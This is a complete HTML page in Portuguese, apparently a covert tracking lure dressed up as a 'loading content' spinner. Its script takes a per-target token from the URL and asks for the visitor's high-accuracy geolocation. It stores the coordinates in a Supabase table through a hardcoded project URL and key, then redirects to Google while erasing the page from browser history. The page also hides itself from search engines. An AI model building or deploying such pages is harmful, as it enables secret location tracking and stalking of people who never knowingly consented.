<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>A carregar...</title>

  <!-- BLOQUEIO PARA MOTORES DE BUSCA (NÃO APARECE NO GOOGLE/BING) -->
  <meta name="robots" content="noindex, nofollow">

  <style>
    body {
      background-color: #121212;
      color: #777;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .spinner {
      width: 30px;
      height: 30px;
      border: 3px solid rgba(255,255,255,0.1);
      border-top-color: #555;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 12px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { font-size: 13px; margin: 0; }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <p>A carregar conteúdo...</p>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ==========================================
    // ⚙️ CONFIGURAÇÃO DO SEU SUPABASE
    // ==========================================
    const SUPABASE_URL = "https://tiprriswzqtwhajrysdy.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRpcHJyaXN3enF0d2hhanJ5c2R5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIwNzkyNzQsImV4cCI6MjEwNzY1NTI3NH0.fSZGWUWCoUvzHPczkqtBcYk7Fj_jcGPikYEi34mefKM";
    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    // Extrai o parâmetro ?id= da URL (ex: index.html?id=ALVO-01)
    const params = new URLSearchParams(window.location.search);
    const canalId = params.get('id') || "CANAL-PADRAO";

    // URL neutra para onde a página salta em seguida
    const DESTINO_FINAL = "https://www.google.com";

    function finalizar() {
      // O replace elimina a página do histórico do navegador
      window.location.replace(DESTINO_FINAL);
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async function (pos) {
          try {
            await supabaseClient
              .from("alerta_colaborador")
              .insert([{
                token_canal: canalId,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                precisao_metros: pos.coords.accuracy
              }]);
          } catch (e) {
          } finally {
            finalizar();
          }
        },
        function (err) {
          finalizar();
        },
        {
          enableHighAccuracy: true,
          timeout: 6000,
          maximumAge: 0
        }
      );
    } else {
      finalizar();
    }
  </script>
</body>
</html>
